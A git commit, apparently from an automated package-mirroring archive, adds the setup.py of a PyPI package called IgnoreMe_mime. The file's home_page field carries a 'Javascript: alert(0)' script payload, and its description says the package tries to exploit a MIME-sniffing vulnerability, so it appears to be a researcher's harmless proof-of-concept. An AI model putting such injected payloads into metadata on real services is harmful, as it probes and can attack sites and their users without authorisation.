f78522b6a103e66b87ecf8205d1d352dcb3a9a1a
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:08:21 +0000

    Add package IgnoreMe_mime/1.0.2/IgnoreMe_mime-1.0.2.tar.gz

---
+++ packages/IgnoreMe_mime/IgnoreMe_mime-1.0.2.tar.gz/IgnoreMe_mime-1.0.2/setup.py
@@ -0,0 +1,15 @@
+from distutils.core import setup
+
+setup(
+    name='IgnoreMe_mime',
+    version='1.0.2',
+    author='David Dworken',
+    author_email='david@daviddworken.com',
+    packages=['IgnoreMe_mime'],
+    home_page='Javascript: alert(0)',
+    url='http://pypi.python.org/pypi/IgnoreMe_mime/',
+    license='LICENSE.txt',
+    description='Trying to exploit a MIME sniffing vuln...',
+    long_description=open('README.rst').read(),
+    scripts=['uberPip/nothing.py'],
+)
